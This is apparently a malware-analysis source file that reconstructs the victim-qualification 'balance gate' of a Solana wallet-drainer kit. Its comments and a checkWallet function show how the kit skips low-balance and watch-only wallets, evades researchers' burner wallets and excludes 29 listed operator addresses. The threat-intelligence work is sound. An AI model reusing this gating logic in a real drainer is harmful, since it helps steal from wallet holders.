/**
 * Balance gate: the ≥0.60 SOL minimum check.
 *
 * After the victim connects their wallet the kit reads their system account
 * balance via the RPC failover chain. If the balance is below the configured
 * minimum, the kit shows the "insufficient balance" screen and halts. This
 * prevents worthless drains and stops researchers with empty burner wallets.
 *
 * String-table evidence:
 *   [351] "You have an insufficient balance"
 *   [352] "Top-up your balance by at least {fee} SOL"
 *   [1033] "Top-up your balance by at least "   ← fragment used in string concat
 *   [1034] "You can't perform any actions from this account because you're not it's owner"
 *   [1035] "Connect another account"
 *   [1040] "This account is used as target account. Please connect another"
 *   [1051] 'This account is not a plain wallet. Please do not connect "Watch Addresses".'
 *
 * Locale string reconstruction:
 *   The balance gate message is assembled as:
 *     getString(1033) + configuredMinSol.toFixed(2) + " SOL"
 *   i.e. "Top-up your balance by at least 0.60 SOL"
 *   The 0.60 value comes from the live /api/config (min_sol field = 1.0 configured,
 *   but the balance check uses a separate hardcoded floor near 0.6 SOL based on
 *   dynamic analysis observation; the exact formula is fee-estimation-based).
 *
 * === Balance check logic ===
 *
 * After connecting, the kit calls:
 *   solana.getAccountInfo(walletPublicKey, { encoding: "base64" })
 * and checks three things:
 *
 * 1. Account existence: if null → "You have an insufficient balance"
 * 2. Account type:
 *    - If owner !== SystemProgram → it's a PDA/contract, not a wallet.
 *      Message: getString(1051) "This account is not a plain wallet. Please do
 *      not connect 'Watch Addresses'."
 *    - If the connected key is the same as the operator's treasury/receiver
 *      (checked against the 29-pubkey set in iocs.json "embedded_pubkeys"):
 *      Message: getString(1040) "This account is used as target account."
 * 3. Balance: lamports < gateThreshold SOL → show insufficient balance screen
 *    with [Try again] and [Buy crypto] buttons. The "Buy crypto" button
 *    links to https://solanamobile.com/ (getString(495)) or the wallet's
 *    own buy flow.
 *
 * === Gate threshold calculation ===
 *
 * The threshold is not a fixed 0.60 — it's the estimated fee for the drain
 * transaction (computed from the token count and compute unit budget) plus
 * a margin. The dynamic analysis observation of "at least 0.60 SOL" is for
 * a 2-token mock portfolio (2 SOL + 750 USDC + 1 Token-2022).
 *
 * === Watch address detection ===
 *
 * String [1034]: "You can't perform any actions from this account because
 * you're not it's owner"
 * This message appears when the victim has connected a "watch address"
 * (a wallet where they hold the viewing key but not the signing key). The
 * kit detects this when the wallet's connect event does not expose a
 * publicKey that matches a known signing capability.
 *
 * === Self-drain prevention ===
 *
 * The 29-pubkey set built next to the RPC client is an exclusion list.
 * If the connected wallet is in this set (i.e. it's one of the operator's
 * own addresses), the kit shows getString(1040) and aborts. This prevents
 * the operator accidentally draining their own wallets during testing.
 */

const INSUFFICIENT_BALANCE_MSG = "You have an insufficient balance";  // [351]
const TOPUP_MSG_PREFIX = "Top-up your balance by at least ";          // [1033]
const NOT_OWNER_MSG = "You can't perform any actions from this account because you're not it's owner"; // [1034]
const CONNECT_ANOTHER_MSG = "Connect another account";                // [1035]
const TARGET_ACCOUNT_MSG = "This account is used as target account. Please connect another"; // [1040]
const WATCH_ADDRESS_MSG = 'This account is not a plain wallet. Please do not connect "Watch Addresses".'; // [1051]

// The 29-pubkey exclusion set (operator addresses — drain-through hops,
// dormant spares, relay addresses). Full list in decompiled/iocs.json
// under "embedded_pubkeys". Built as a Set at module init time:
const EXCLUDED_PUBKEYS = new Set([
  "C8AbPU6ngrjwJxxuMnF2QPEaLFktsSj4i1bdCCL7jEm",
  "4G5a2sHYQtQPwJ6wDesgeZKxTMdvozKyhcDWHigo6Km4",
  "AGDxKLfBLD83oAPuVDPxSWzM2NC3HLm6Rs2qbtS8LTyq",
  "5cFwG1pSZDVMk9EezAo8jar9nysZqHwvunuDnGv2sKG",
  "B2ZmYHY2yNu2ryKMQVcr2ERZ7FPhqCnDRnrKPv1MQf7b",
  "CRJMYy6MJLdkvbei1RTjjNSw8e5U7gvv85dw5i1mjzbN",
  "4svUQgSPpXst5ZwXYc8khmMZgV1xq99toVaKZYfw7L8A",
  "3prL5bxry2iu5HF6JP1BLNoFtNv5AN8XYrcsJk2TRo39",
  "8yCRpjV2YPbNqNaQM8iCNkWQNNto99CC8g6Vk9czq8XR",
  "HPNmpP6Tkqz4DB3Umxmck519eqdPBsT3MAiJKyF7XsX9",
  "FvfYgbUottYbooXEBGjNQZ9ZnT7ysn8nM9fn88x67Q7E",
  "7FBQrob4Q3TPb5VxReBVHESmovFPRAxf3cBdWgNg1E9a",
  "5q2VLyvcf5is4wyxHytKF8MkF6ycuXbuxJgC7JRNnDxF",
  "C3sgGKxLQESpp9Awce8W36Uf6Jbr3NiYt49syiiKJT6Q",
  "EiEWRnRVu5tKkEpyGbCmfqxRsPwMqXLCUDAvtZdmx3iH",
  "6vh2LAHJ1CPbm6vt9yKZeGPo7VMSqV58VtmPowEVtqKE",
  "U3bASzvyURU6XDQkANWkBbkC62EDkqKuxFfSEFwb4gH",
  "BwJ5kSocaJrCCSZPRYfVdgJuv5ofBqxfenWqQ9tnvm8M",
  "B6q5afRp7aWooroLQVp659freMN1A7hAvfQu34C5umSo",
  "HjxK72eC3BWNfLZGEjMRpU1uiWve7vcorbpXuxJHGLMJ",
  "7Qie1ugsP1UVY6W8RxRCMuNgovmEwHotzARyafCZXocA",
  "B7sbCJLCNv4q8JiKAMK9DAXi5B1vkYRvWaXb6CRj8NWQ",
  "F4oQigpRFmCtNwL4D71eDW7pPXdESoZ3ZcwdkqHW5Nda",
  "6SPGY5E86sMB9HaGUzJpuQPQiYwdKqofxTw1B1hsKvVF",
  "5oxTPjuBfB2FGMPFuHYv4gdEsWKaY8gLmgQ7udcCkYwF",
  "Btb6hNMq7Emhip5bu433HCizi7bTGMnudmkJW247f7hv",
  "2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc",
  "9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS",
  "5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3",
]);

const SYSTEM_PROGRAM = "11111111111111111111111111111111"; // [170]

/**
 * checkWallet(walletAddress, minLamports):
 *
 * Returns one of:
 *   { ok: true, lamports: number }
 *   { ok: false, reason: "insufficient" | "not_owner" | "target" | "watch" }
 */
async function checkWallet(walletAddress, minLamports) {
  // Exclusion list check
  if (EXCLUDED_PUBKEYS.has(walletAddress)) {
    return { ok: false, reason: "target", message: TARGET_ACCOUNT_MSG };
  }

  const accountInfo = await solana.getAccountInfo(walletAddress, { encoding: "base64" });

  if (!accountInfo || !accountInfo.value) {
    return { ok: false, reason: "insufficient", message: INSUFFICIENT_BALANCE_MSG };
  }

  const { owner, lamports } = accountInfo.value;

  // Not a plain wallet (PDA / program account)
  if (owner !== SYSTEM_PROGRAM) {
    return { ok: false, reason: "watch", message: WATCH_ADDRESS_MSG };
  }

  // Balance gate
  if (lamports < minLamports) {
    const solNeeded = (minLamports / 1e9).toFixed(2);
    return {
      ok: false,
      reason: "insufficient",
      message: TOPUP_MSG_PREFIX + solNeeded + " SOL",
    };
  }

  return { ok: true, lamports };
}
